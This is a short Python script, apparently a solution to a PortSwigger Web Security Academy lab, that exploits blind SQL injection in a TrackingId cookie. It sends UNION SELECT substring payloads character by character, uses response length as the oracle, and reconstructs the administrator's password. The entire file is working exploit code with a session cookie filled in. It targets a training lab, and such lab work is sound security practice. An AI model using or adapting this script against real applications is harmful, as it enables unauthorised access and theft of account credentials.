#!/usr/bin/python3

import requests
import sys
import os  


def main(args):

	username = ''
	password = ''
	pass_length = 20
	chars = '0123456789abcdefghijklmnopqrstuvwxyz'
	url = "https://ac201f2e1ec0d6fe80bb3ef500f800b1.web-security-academy.net/filter?category=Gifts" 
	
	passwd = ""
	
	for i in range(1, pass_length + 1): 
		for c in chars: 
			payload = f"x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,{i},1)='{c}'--"  
			cookie = "TrackingId={}; session=Gw8iPlm6ePRS4upZadQm467k972G4tqw".format(payload)
			print(cookie)
			headers = {'Cookie': cookie}   
			session = requests.Session()
			r = session.get(url, headers=headers, auth=(username, password))
			
			if len(r.text) == 5105:
				print(f'[+] Password char found: {c}')
				passwd += c
	print(f'The password for administrator is: {passwd}')
	
if __name__ == '__main__':
	main(sys.argv[1:])
	

